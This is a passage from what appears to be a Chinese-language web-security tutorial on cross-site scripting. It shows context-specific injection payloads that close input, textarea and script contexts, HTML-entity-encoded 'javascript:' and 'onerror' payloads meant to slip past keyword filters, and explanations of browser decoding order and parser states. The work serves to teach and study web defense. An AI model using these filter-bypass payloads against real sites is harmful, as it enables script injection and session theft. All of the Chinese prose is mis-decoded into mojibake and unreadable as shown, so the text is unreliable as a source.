class="attr">value</span>=<span class="string">&quot;[è¾“å‡ºç‚¹]&quot;</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span>/&gt;</span></span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªèƒ½æŠŠinputæ ‡ç­¾é—­åˆï¼Œç„¶åç›´æ¥æ‰§è¡Œè„šæœ¬ï¼Œå¦åˆ™ä¼šå› ä¸ºtypeä¸ºhiddenå¯¼è‡´æ— æ³•æ‰§è¡Œè„šæœ¬ã€‚</p><h3 id="è¾“å‡ºåœ¨HTMLæ ‡ç­¾ä¹‹é—´"><a href="#è¾“å‡ºåœ¨HTMLæ ‡ç­¾ä¹‹é—´" class="headerlink" title="è¾“å‡ºåœ¨HTMLæ ‡ç­¾ä¹‹é—´"></a>è¾“å‡ºåœ¨HTMLæ ‡ç­¾ä¹‹é—´</h3><p>ä¾‹å¦‚è¾“å‡ºçš„ä½ç½®å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;div id=<span class="string">&quot;body&quot;</span>&gt;[è¾“å‡º]&lt;/div&gt;</span><br></pre></td></tr></table></figure><p>ç›´æ¥æäº¤ <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> å³å¯è§¦å‘XSSï¼Œä½†æ˜¯å½“æ ‡ç­¾æ˜¯ä¸èƒ½æ‰§è¡Œè„šæœ¬çš„æ ‡ç­¾æ—¶ï¼Œå¦‚ä¸‹é¢è¿™å‡ ä¸ªï¼š</p><ul><li><code>&lt;title&gt;&lt;/title&gt;</code></li><li><code>&lt;textarea&gt;&lt;/textarea&gt;</code></li><li><code>&lt;xmp&gt;&lt;/xmp&gt;</code></li><li><code>&lt;iframe&gt;&lt;/iframe&gt;</code></li></ul><p>é‚£ä¹ˆå°±å¾—å…ˆæŠŠé‚£ä¸ªæ ‡ç­¾é—­åˆï¼ˆåæ–‡ä¼šè®²åˆ°åŸç†ï¼‰ï¼Œç„¶ååœ¨æ³¨å…¥XSSè¯­å¥ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;<span class="regexp">/textarea&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</span><br></pre></td></tr></table></figure><h3 id="è¾“å‡ºåœ¨scriptæ ‡ç­¾ä¹‹é—´"><a href="#è¾“å‡ºåœ¨scriptæ ‡ç­¾ä¹‹é—´" class="headerlink" title="è¾“å‡ºåœ¨scriptæ ‡ç­¾ä¹‹é—´"></a>è¾“å‡ºåœ¨scriptæ ‡ç­¾ä¹‹é—´</h3><p>ä¾‹å¦‚ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    <span class="keyword">var</span> x = <span class="string">&quot;input&quot;</span>;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å¯æ§ä½ç½®åœ¨inputï¼Œå¯ä»¥é—­åˆscriptæ ‡ç­¾æ’å…¥ä»£ç ï¼Œä½†æ˜¯åŒæ ·æˆ‘ä»¬ä»…ä»…é—­åˆåŒå¼•å·å°±å¯ä»¥æ‰§è¡Œjsä»£ç äº†ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;;alert(1)//</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// è¾“å‡ºåå¦‚ä¸‹:</span></span><br><span class="line"><span class="string">&lt;script&gt;var x = &quot;</span><span class="string">&quot;;alert(1)//&quot;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="å­—ç¬¦ç¼–ç ç»•è¿‡"><a href="#å­—ç¬¦ç¼–ç ç»•è¿‡" class="headerlink" title="å­—ç¬¦ç¼–ç ç»•è¿‡"></a>å­—ç¬¦ç¼–ç ç»•è¿‡</h1><p>åœ¨XSSä¸­ï¼Œè¿˜æœ‰ä¸€ä¸ªç»•è¿‡å…³é”®å­—è¿‡æ»¤çš„æ–¹æ³•ï¼Œé‚£å°±æ˜¯å­—ç¬¦ç¼–ç ç»•è¿‡ã€‚è¿™é‡Œç»™å‡ºä¸€ä¸ªç¼–ç ç½‘ç«™ï¼š<a href="https://bianma.bmcx.com/">https://bianma.bmcx.com/</a></p><p>ç¼–ç å±äºè®¡ç®—æœºç³»ç»Ÿçš„åŸºç¡€çŸ¥è¯†ï¼Œå…¶å†…å®¹å†™èµ·æ¥ä¼°è®¡ä¹Ÿå¯ä»¥å‡ºæœ¬ä¹¦äº†ï¼Œä¸è¿‡æˆ–å¤šæˆ–å°‘æˆ‘ä»¬éƒ½æœ‰æ‰€äº†è§£ï¼Œæ€»çš„æ¥è¯´ï¼Œç¼–ç å°±æ˜¯å°†å­—ç¬¦å˜ä¸ºäºŒè¿›åˆ¶æ•°ï¼Œè€Œè§£ç å°±æ˜¯å°†äºŒè¿›åˆ¶æ•°è¿˜åŸä¸ºå­—ç¬¦ã€‚ä»æµè§ˆå™¨è¯·æ±‚urlåˆ°åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºå‡ºæ¥ä¹Ÿç»å†äº†ä¸€äº›ç¼–ç å’Œè§£ç è¿‡ç¨‹ï¼Œä¸‹é¢å¤§æ¦‚ä»‹ç»ä¸€ä¸‹æµç¨‹ã€‚</p><h2 id="è¯·æ±‚ç½‘é¡µè§£ç æµç¨‹"><a href="#è¯·æ±‚ç½‘é¡µè§£ç æµç¨‹" class="headerlink" title="è¯·æ±‚ç½‘é¡µè§£ç æµç¨‹"></a>è¯·æ±‚ç½‘é¡µè§£ç æµç¨‹</h2><ul><li><strong>HTML ç¼–ç &#x2F;è§£ç </strong></li></ul><p>å½“æµè§ˆå™¨æ¥æ”¶åˆ°æœåŠ¡ç«¯å‘é€æ¥çš„äºŒè¿›åˆ¶æ•°æ®åï¼Œé¦–å…ˆä¼šå¯¹å…¶è¿›è¡ŒHTMLè§£ç ï¼Œå‘ˆç°å‡ºæ¥çš„å°±æ˜¯æˆ‘ä»¬çœ‹åˆ°çš„æºä»£ç ã€‚å…·ä½“çš„è§£ç æ–¹å¼ä¾å…·ä½“æƒ…å†µè€Œå®šï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦åœ¨é¡µé¢ä¸­æŒ‡å®šç¼–ç ï¼Œé˜²æ­¢æµè§ˆå™¨æŒ‰ç…§é”™è¯¯çš„æ–¹å¼è§£ç ï¼Œé€ æˆä¹±ç ã€‚</p><p>ä½†æ˜¯åœ¨HTMLä¸­æœ‰äº›å­—ç¬¦æ˜¯å’Œå…³é”®è¯å†²çªçš„ï¼Œæ¯”å¦‚ <code>&lt;</code>ã€<code>&gt;</code>ã€<code>&amp;</code>ï¼Œè§£ç ä¹‹åï¼Œæµè§ˆå™¨ä¼šè¯¯è®¤ä¸ºå®ƒä»¬æ˜¯HTMLæ ‡ç­¾ï¼Œå¦‚æœå¸Œæœ›æ­£ç¡®åœ°æ˜¾ç¤ºé¢„ç•™å­—ç¬¦ï¼Œå°±éœ€è¦åœ¨HTMLä¸­ä½¿ç”¨å¯¹åº”çš„HTMLå­—ç¬¦å®ä½“ã€‚</p><p>å­—ç¬¦å®ä½“æ˜¯ä¸€ä¸ªè½¬ä¹‰åºåˆ—ï¼Œå®ƒå®šä¹‰äº†ä¸€èˆ¬æ— æ³•åœ¨æ–‡æœ¬å†…å®¹ä¸­è¾“å…¥çš„å•ä¸ªå­—ç¬¦æˆ–ç¬¦å·ã€‚ä¸€ä¸ªå­—ç¬¦å®ä½“ä»¥ä¸€ä¸ª&amp;ç¬¦å·å¼€å¤´ï¼Œåé¢è·Ÿç€ä¸€ä¸ªé¢„å®šä¹‰çš„å®ä½“çš„åç§°ï¼Œæˆ–ç”¨&amp;#å¼€å¤´+å®ä½“ç¼–å·+åˆ†å·æ¥è¡¨ç¤ºã€‚</p><p>å¸¸è§çš„HTMLå­—ç¬¦å®ä½“æœ‰ï¼š</p><table><thead><tr><th>æ˜¾ç¤ºç»“æœ</th><th>æè¿°</th><th>å®ä½“åç§°</th><th>å®ä½“ç¼–å·</th></tr></thead><tbody><tr><td></td><td>ç©ºæ ¼</td><td><code> </code></td><td><code> </code></td></tr><tr><td>&lt;</td><td>å°äºå·</td><td><code>&lt;</code></td><td><code>&lt;</code></td></tr><tr><td>&gt;</td><td>å¤§äºå·</td><td><code>&gt;</code></td><td><code>&gt;</code></td></tr><tr><td>&amp;</td><td>å’Œå·</td><td><code>&amp;</code></td><td><code>&amp;</code></td></tr><tr><td>â€œ</td><td>å¼•å·</td><td><code>&quot;</code></td><td><code>&quot;</code></td></tr><tr><td>â€˜</td><td>æ’‡å·</td><td><code>&#39;</code>(IEä¸æ”¯æŒ)</td><td><code>&#39;</code></td></tr></tbody></table><p>ä½†å¹¶ä¸æ˜¯æ‰€æœ‰çš„å­—ç¬¦éƒ½æœ‰å®ä½“åç§°ï¼Œä½†æ˜¯å®ƒä»¬éƒ½æœ‰è‡ªå·±çš„å®ä½“ç¼–å·ã€‚</p><p>ä¸€ä¸ªHTMLè§£æå™¨ä½œä¸ºä¸€ä¸ªçŠ¶æ€æœºï¼Œå®ƒä»è¾“å…¥æµä¸­è·å–å­—ç¬¦å¹¶æŒ‰ç…§è½¬æ¢è§„åˆ™è½¬æ¢åˆ°å¦ä¸€ç§çŠ¶æ€ã€‚åœ¨è§£æè¿‡ç¨‹ä¸­ï¼Œä»»ä½•æ—¶å€™å®ƒåªè¦é‡åˆ°ä¸€ä¸ª <code>&lt;</code> ç¬¦å·ï¼ˆåé¢æ²¡æœ‰è·Ÿ <code>/</code>ç¬¦å·ï¼‰å°±ä¼šè¿›å…¥ <strong>æ ‡ç­¾å¼€å§‹çŠ¶æ€(Tag open state)</strong> ï¼Œç„¶åè½¬å˜åˆ° <strong>æ ‡ç­¾åçŠ¶æ€(Tag name state)</strong> ã€ <strong>å‰å±æ€§åçŠ¶æ€(before attribute name state)</strong> â€¦â€¦æœ€åè¿›å…¥ <strong>æ•°æ®çŠ¶æ€(Data state)</strong> å¹¶é‡Šæ”¾å½“å‰æ ‡ç­¾çš„tokenã€‚å½“è§£æå™¨å¤„äº æ•°æ®çŠ¶æ€(Data state) æ—¶ï¼Œå®ƒä¼šç»§ç»­è§£æï¼Œæ¯å½“å‘ç°ä¸€ä¸ªå®Œæ•´çš„æ ‡ç­¾ï¼Œå°±ä¼šé‡Šæ”¾å‡ºä¸€ä¸ªtokenã€‚</p><p>ç®€å•çš„è¯´å°±æ˜¯ï¼Œæµè§ˆå™¨å¯¹HTMLè§£ç ä¹‹åå°±å¼€å§‹è§£æHTMLæ–‡æ¡£ï¼Œå°†ä¼—å¤šæ ‡ç­¾è½¬åŒ–ä¸ºå†…å®¹æ ‘ä¸­çš„DOMèŠ‚ç‚¹ï¼Œæ­¤æ—¶è¯†åˆ«æ ‡ç­¾çš„æ—¶å€™ï¼ŒHTMLè§£æå™¨æ˜¯æ— æ³•è¯†åˆ«é‚£äº›è¢«å®ä½“ç¼–ç çš„å†…å®¹çš„ï¼Œåªæœ‰å»ºç«‹èµ·DOMæ ‘ï¼Œæ‰èƒ½å¯¹æ¯ä¸ªèŠ‚ç‚¹çš„å†…å®¹è¿›è¡Œè¯†åˆ«ï¼Œå¦‚æœå‡ºç°å®ä½“ç¼–ç ï¼Œåˆ™ä¼šè¿›è¡Œå®ä½“è§£ç ï¼Œåªè¦æ˜¯DOMèŠ‚ç‚¹é‡Œå±æ€§çš„å€¼ï¼Œéƒ½å¯ä»¥è¢«HTMLç¼–ç å’Œè§£æã€‚</p><p>æ‰€ä»¥åœ¨PHPä¸­ï¼Œä½¿ç”¨htmlspecialchars()å‡½æ•°æŠŠé¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“ï¼Œåªæœ‰ç­‰åˆ°DOMæ ‘å»ºç«‹èµ·æ¥åï¼Œæ‰ä¼šè§£æHTMLå®ä½“ï¼Œèµ·åˆ°äº†XSSé˜²æŠ¤ä½œç”¨ã€‚</p><ul><li><strong>URL è§£ç </strong></li></ul><p>URLç¼–ç æ˜¯ä¸ºäº†å…è®¸URLä¸­å­˜åœ¨æ±‰å­—è¿™æ ·çš„éæ ‡å‡†å­—ç¬¦ï¼Œæœ¬è´¨æ˜¯æŠŠä¸€ä¸ªå­—ç¬¦è½¬ä¸º%åŠ ä¸ŠUTF-8ç¼–ç å¯¹åº”çš„16è¿›åˆ¶æ•°å­—ã€‚æ‰€ä»¥åˆç§°ä¹‹ä¸ºPercent-encodingã€‚</p><p>åœ¨æœåŠ¡ç«¯æ¥æ”¶åˆ°è¯·æ±‚æ—¶ï¼Œä¼šè‡ªåŠ¨å¯¹è¯·æ±‚è¿›è¡Œä¸€æ¬¡URLè§£ç ã€‚</p><ul><li><strong>JavaScript è§£ç ï¼ˆåªæ”¯æŒUnicodeï¼‰</strong></li></ul><p>å½“HTMLè§£æäº§ç”ŸDOMèŠ‚ç‚¹åï¼Œä¼šæ ¹æ®DOMèŠ‚ç‚¹æ¥åšæ¥ä¸‹æ¥çš„è§£æå·¥ä½œï¼Œæ¯”å¦‚åœ¨å¤„ç†è¯¸å¦‚ <code>&lt;script&gt;</code>ã€<code>&lt;style&gt;</code> è¿™æ ·çš„æ ‡ç­¾æ—¶ï¼Œè§£æå™¨ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°JavaScriptè§£ææ¨¡å¼ï¼Œè€Œ <code>src</code>ã€ <code>href</code> åè¾¹åŠ å…¥çš„ javascript ä¼ªURLï¼Œä¹Ÿä¼šè¿›å…¥ JavaScript çš„è§£ææ¨¡å¼ã€‚</p><p>æ¯”å¦‚ <code>&lt;a href=&quot;javascript:alert(&#39;\u0031&#39;)&quot;&gt;test&lt;/a&gt;</code>ï¼ŒJavaScript å‡ºå‘äº† JavaScript è§£é‡Šå™¨ï¼ŒJavaScript ä¼šå…ˆå¯¹å†…å®¹è¿›è¡Œè§£æï¼Œé‡Œè¾¹æœ‰ä¸€ä¸ªè½¬ä¹‰å­—ç¬¦<code>\u0031</code>ï¼Œå‰å¯¼çš„ u è¡¨ç¤ºä»–æ˜¯ä¸€ä¸ªunicode å­—ç¬¦ï¼Œæ ¹æ®åè¾¹çš„æ•°å­—ï¼Œè§£æä¸ºâ€œ1â€ï¼Œäºæ˜¯åœ¨å®Œæˆ JavaScript çš„è§£æä¹‹åå˜æˆäº† <code>&lt;a href=&quot;javascript:alert(&#39;1&#39;)&quot;&gt;test&lt;/a&gt;</code>ã€‚</p><p><strong>ä¸‹é¢ç”¨ä¸€ä¸ªæ™®é€šçš„XSSä»£ç æ¥è¯´æ˜ä¸€ä¸‹æµè§ˆå™¨å¯¹å…¶è§£æçš„è¿‡ç¨‹ã€‚</strong></p><ul><li><code>&lt;a href=&quot;javascript:alert(&#39;xss&#39;)&quot;&gt;test&lt;/a&gt;</code></li></ul><p>é¦–å…ˆHTMLè§£æå™¨å¼€å§‹å·¥ä½œï¼Œå¹¶å¯¹hrefä¸­çš„å­—ç¬¦åšHTMLè§£ç ï¼Œæ¥ä¸‹æ¥URLè§£æå™¨å¯¹hrefå€¼è¿›è¡Œè§£ç ï¼Œæ­£å¸¸æƒ…å†µä¸‹URLå€¼ä¸ºä¸€ä¸ªæ­£å¸¸çš„URLé“¾æ¥ï¼Œå¦‚ï¼š<code>https://www.baidu.com</code>ï¼Œé‚£ä¹ˆURLè§£æå™¨å·¥ä½œå®Œæˆåæ˜¯ä¸éœ€è¦å…¶ä»–è§£ç çš„ï¼Œä½†æ˜¯è¯¥ç¯å¢ƒä¸­URLèµ„æºç±»å‹ä¸ºJavascriptï¼Œå› æ­¤è¯¥ç¯å¢ƒä¸­æœ€åä¸€æ­¥Javascriptè§£æå™¨è¿˜ä¼šè¿›è¡Œè§£ç æ“ä½œï¼Œæœ€åè§£æçš„è„šæœ¬å°†è¢«æ‰§è¡Œã€‚</p><p>æ•´ä¸ªè§£æé¡ºåºä¸º3ä¸ªç¯èŠ‚ï¼šHTMLè§£ç  â€”&gt;URLè§£ç  â€”&gt;JSè§£ç </p><p>æˆ‘ä»¬å¯ä»¥å¯¹XSSæ”»å‡»å‘é‡åšè¿™ä¸‰ç§ç¼–ç éƒ½å¯ä»¥æˆåŠŸå¼¹æ¡†ã€‚</p><h2 id="HTML-å®ä½“ç¼–ç "><a href="#HTML-å®ä½“ç¼–ç " class="headerlink" title="HTML å®ä½“ç¼–ç "></a>HTML å®ä½“ç¼–ç </h2><p>æˆ‘ä»¬å¯ä»¥å°†DOMèŠ‚ç‚¹ä¸­çš„å†…å®¹è½¬åŒ–ä¸ºHTMLå®ä½“ï¼Œå› ä¸ºè§£æHTMLä¹‹åå»ºç«‹èµ·èŠ‚ç‚¹ï¼Œç„¶åä¼šå¯¹DOMèŠ‚ç‚¹é‡Œé¢çš„HTMLå®ä½“è¿›è¡Œè§£æã€‚HTML ç¼–ç ä¸»è¦åˆ†ä¸º10è¿›åˆ¶å’Œ16è¿›åˆ¶ï¼Œæ ¼å¼ä¸ºä»¥ <code>&amp;#</code> å¼€å¤´ä»¥åˆ†å· <code>;</code> ç»“å°¾ï¼ˆä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å·ï¼‰ã€‚</p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">// åè¿›åˆ¶</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// åå…­è¿›åˆ¶</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// ä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å·</span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">// åè¿›åˆ¶</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// åå…­è¿›åˆ¶</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// ä¹Ÿå¯ä»¥ä¸å¸¦åˆ†å·</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x22&amp;#x78&amp;#x73&amp;#x73&amp;#x22&amp;#x29</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¦æ³¨æ„ï¼Œå¯¹äºHTMLå­—ç¬¦å®ä½“ï¼Œå¹¶ä¸æ˜¯è¯´ä»»ä½•åœ°æ–¹éƒ½å¯ä»¥ä½¿ç”¨å®ä½“ç¼–ç ï¼Œåªæœ‰å¤„äº â€œæ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€ã€â€œå±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€ å’Œ â€œRCDATAçŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨â€ è¿™ä¸‰ç§çŠ¶æ€ä¸­çš„HTMLå­—ç¬¦å®ä½“å°†ä¼šä» <code>&amp;#â€¦</code> å½¢å¼è§£ç ï¼Œè½¬åŒ–æˆå¯¹åº”çš„è§£ç å­—ç¬¦å¹¶è¢«æ”¾å…¥æ•°æ®ç¼“å†²åŒºä¸­ã€‚</p><p><strong>ï¼ˆ1ï¼‰æ•°æ®çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼š</strong>æ•°æ®çŠ¶æ€å°±æ˜¯è§£æä¸€ä¸ªæ ‡ç­¾å†…é‡Œé¢çš„å†…å®¹ï¼Œå¦‚ <code>&lt;div&gt;...&lt;/div&gt;</code> ä¸­çš„å†…å®¹ï¼Œå½“æµè§ˆå™¨è§£æå®Œ <code>&lt;div&gt;</code> æ ‡ç­¾ä¹‹åå¦‚æœå‘ç°æ ‡ç­¾å†…è¿˜å«æœ‰å®ä½“å­—ç¬¦çš„è¯ï¼Œå°±ä¼šæœ‰ä¸€ä¸ªå®ä½“ç¼–ç è§£æäº†ï¼Œå¦‚ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="symbol">&amp;#60;</span>img src=x onerror=alert(&quot;xss&quot;)<span class="symbol">&amp;#62;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾ï¼Œæ­¤æ—¶åœ¨é¡µé¢ä¸Šæ˜¾ç¤ºçš„æ˜¯ç»è¿‡è½¬ä¹‰çš„å†…å®¹ï¼š</p><p><img src="/../images/20210523094712-cb6a83bc-bb68-1.png" alt="image-20230524205745342"></p><p>è¿™çœ‹ä¸Šå»æ˜¯ä¸€ä¸ªæ ‡å‡†çš„æ ‡ç­¾è¯­è¨€ï¼Œä½†å¹¶ä¸ä¼šè§¦å‘xssï¼Œå› ä¸ºå½“å‰HTMLè§£æå™¨å¤„äºâ€œæ•°æ®çŠ¶æ€â€ï¼Œä¸ä¼šè½¬æ¢åˆ°â€œæ ‡ç­¾å¼€å§‹çŠ¶æ€â€ï¼Œæ‰€ä»¥å°±ä¸ä¼šå»ºç«‹æ–°çš„æ ‡ç­¾ã€‚å› æ­¤ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåˆ©ç”¨å­—ç¬¦å®ä½“ç¼–ç è¿™ä¸ªè¡Œä¸ºæ¥è½¬ä¹‰ç”¨æˆ·è¾“å…¥çš„æ•°æ®ä»è€Œç¡®ä¿ç”¨æˆ·è¾“å…¥çš„æ•°æ®åªèƒ½è¢«è§£ææˆâ€œæ•°æ®â€è€Œä¸æ˜¯XSSæ”»å‡»å‘é‡ã€‚</p><p><strong>ï¼ˆ2ï¼‰å±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼š</strong>å±æ€§å€¼çŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨å°±å¥½ç†è§£äº†ï¼Œå°±æ˜¯srcï¼Œherfè¿™æ ·çš„å±æ€§å€¼ä¸­çš„HTMLå®ä½“ï¼Œä»–ä¹Ÿæ˜¯ä¼šå…ˆè¿›è¡ŒHTMLè§£ç çš„ï¼Œæ¯”å¦‚ä¸‹é¢çš„è¯­å¥ï¼Œä¼šå…ˆå¯¹é‡Œé¢HTMLè§£ç ï¼Œç„¶åå†ç»§ç»­å¾€ä¸‹æ‰§è¡Œï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;a href=&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;&gt;test&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><strong>ï¼ˆ3ï¼‰RCDATAçŠ¶æ€ä¸­çš„å­—ç¬¦å¼•ç”¨ï¼š</strong>ç„¶åå†æ¥çœ‹ä¸€ä¸‹ä»€ä¹ˆæ˜¯RCDATAè½¬æ€ï¼Œè¿™é‡Œéœ€è¦æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹HTMLä¸­æœ‰äº”ç±»å…ƒç´ ï¼š</p><ol><li>ç©ºå…ƒç´ (Void elements)ï¼Œå¦‚ <code>&lt;area&gt;</code>ã€<code>&lt;br&gt;</code>ã€<code>&lt;base&gt;</code> ç­‰ç­‰ã€‚ç©ºå…ƒç´ ä¸èƒ½å®¹çº³ä»»ä½•å†…å®¹ï¼Œå› ä¸ºå®ƒä»¬æ²¡æœ‰é—­åˆæ ‡ç­¾ï¼Œæ²¡æœ‰å†…å®¹èƒ½å¤Ÿæ”¾åœ¨å¼€å§‹æ ‡ç­¾å’Œé—­åˆæ ‡ç­¾ä¸­é—´ã€‚</li><li>åŸå§‹æ–‡æœ¬å…ƒç´ (Raw text elements)ï¼Œæœ‰ <code>&lt;script&gt;</code> å’Œ <code>&lt;style&gt;</code>ã€‚åŸå§‹æ–‡æœ¬å…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬ã€‚</li><li>RCDATAå…ƒç´ (RCDATA elements)ï¼Œæœ‰ <code>&lt;textarea&gt;</code> å’Œ <code>&lt;title&gt;</code>ã€‚RCDATAå…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬å’Œå­—ç¬¦å¼•ç”¨ã€‚</li><li>å¤–éƒ¨å…ƒç´ (Foreign elements)ï¼Œä¾‹å¦‚MathMLå‘½åç©ºé—´æˆ–è€…SVGå‘½åç©ºé—´çš„å…ƒç´ ã€‚å¤–éƒ¨å…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€CDATAæ®µã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šã€‚</li><li>åŸºæœ¬å…ƒç´ (Normal elements)ï¼Œå³é™¤äº†ä»¥ä¸Š4ç§å…ƒç´ ä»¥å¤–çš„å…ƒç´ ã€‚åŸºæœ¬å…ƒç´ å¯ä»¥å®¹çº³æ–‡æœ¬ã€å­—ç¬¦å¼•ç”¨ã€å…¶ä»–å…ƒç´ å’Œæ³¨é‡Šã€‚</li></ol><p>æ³¨æ„åˆ°RCDATAå…ƒç´ ä¸­æœ‰ <code>&lt;textarea&gt;</code> å’Œ <code>&lt;title&gt;</code> ä¸¤ä¸ªå±æ€§å¹¶ä¸”æœ‰å­—ç¬¦å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯å½“å®ä½“å­—ç¬¦å‡ºç°åœ¨è¿™ä¸¤ä¸ªæ ‡ç­¾é‡Œé¢çš„æ—¶å€™ï¼Œå®ä½“å­—ç¬¦ä¼šè¢«è¯†åˆ«å¹¶è¿›è¡ŒHTMLç¼–ç è§£æã€‚è¿™é‡Œè¦å†æé†’ä¸€æ¬¡ï¼Œåœ¨è§£æè¿™äº›å­—ç¬¦å¼•ç”¨çš„è¿‡ç¨‹ä¸­ä¸ä¼šè¿›å…¥â€œæ ‡ç­¾å¼€å§‹çŠ¶æ€â€ï¼Œæ‰€ä»¥å°±ä¸ä¼šå»ºç«‹æ–°çš„æ ‡ç­¾ï¼Œæ‰€ä»¥ä¸‹é¢è¿™ä¸ªè¯­å¥è§¦å‘ä¸äº†XSSï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="symbol">&amp;#60;</span>script<span class="symbol">&amp;#62;</span>alert(&quot;xss&quot;)<span class="symbol">&amp;#60;</span>/script<span class="symbol">&amp;#62;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/20210523094713-cbda5a48-bb68-1.png" alt="img"></p><p>ä½†æ˜¯å¦‚æœç›´æ¥æ”¾è¿›å»æ ‡ç­¾çš„å†…å®¹å‘¢ï¼Œä¸å¸¦è½¬ä¹‰å­—ç¬¦å‘¢ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span 